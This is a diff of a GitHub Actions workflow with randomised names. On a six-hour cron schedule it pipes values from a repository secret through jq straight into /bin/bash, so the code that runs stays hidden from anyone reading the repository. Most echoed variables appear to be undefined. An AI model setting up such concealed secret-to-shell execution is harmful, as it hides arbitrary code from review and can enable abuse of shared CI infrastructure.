@@ -1,29 +1,25 @@
 name: xiaoshouya4617
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 2/6 * * *'
-
+    - cron: '3 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xiaoshouya4617
         env:
-          phhy45170: ${{ secrets.phhy45170 }}
+          pdeqn53: ${{ secrets.pdeqn53 }}
         run: |
-          echo $phhy45170 | jq -r .vlub7 | /bin/bash
-          echo $lv1841 | jq -r .cww3 | /bin/bash
-          echo $pp5 | jq -r .dal57586 | /bin/bash
-          echo $jkg65 | jq -r .rvatm467 | /bin/bash
-          echo $bq880 | jq -r .ptw2 | /bin/bash
-          echo $njsl01456 | jq -r .xqwjl20575 | /bin/bash
-          echo $kzyr1455 | jq -r .sei06993 | /bin/bash
-          echo $pgzy2580 | jq -r .ob989 | /bin/bash
-          echo $frzq8 | jq -r .nfrxe66385 | /bin/bash
-          echo $pvcgd7028 | jq -r .t27280 | /bin/bash
-          echo $p8087 | jq -r .y549 | /bin/bash
-          echo $pycj96533 | jq -r .fqr3358 | /bin/bash
+          echo $pdeqn53 | jq -r .urdg5382 | /bin/bash
+          echo $xou07 | jq -r .coy9074 | /bin/bash
+          echo $tyt7 | jq -r .o79424 | /bin/bash
+          echo $gkioz571 | jq -r .zb74 | /bin/bash
+          echo $us0 | jq -r .dxbwm90436 | /bin/bash
+          echo $pqz61 | jq -r .npa427 | /bin/bash
+          echo $hl69976 | jq -r .qpar81 | /bin/bash
+          echo $lmlh7 | jq -r .nio38672 | /bin/bash
+          echo $rkupt673 | jq -r .ohwz46973 | /bin/bash
 
